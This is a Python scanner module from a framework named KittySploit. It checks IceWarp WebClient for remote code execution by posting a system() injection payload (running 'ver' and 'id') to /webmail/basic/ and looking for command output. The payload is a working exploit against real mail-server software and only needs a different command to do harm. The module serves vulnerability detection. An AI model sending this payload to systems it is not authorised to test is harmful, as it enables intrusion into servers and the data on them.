#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""IceWarp WebClient is susceptible to remote code execution."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'IceWarp WebClient - Remote Code Execution Detection',
        'description': 'IceWarp WebClient is susceptible to remote code execution.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'icewarp', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
    }

    def run(self):
        path = '/webmail/basic/'
        # Windows probe
        r = self.http_request(
            method='POST',
            path=path,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            data="_dlg[captcha][target]=system(\\'ver\\')\\\n",
            allow_redirects=False,
        )
        body = (r.text or '') if r else ''
        if r and 'Microsoft Windows [Version' in body:
            self.set_info(
                severity='critical',
                reason='IceWarp WebClient RCE confirmed (ver)',
                path=path,
            )
            return True
        # Linux probe — confirm uid= rather than status alone
        r2 = self.http_request(
            method='POST',
            path=path,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            data="_dlg[captcha][target]=system(\\'id\\')\\\n",
            allow_redirects=False,
        )
        body2 = (r2.text or '') if r2 else ''
        if r2 and re.search(r'uid=\d+', body2):
            self.set_info(
                severity='critical',
                reason='IceWarp WebClient RCE confirmed (id)',
                path=path,
            )
            return True
        return False

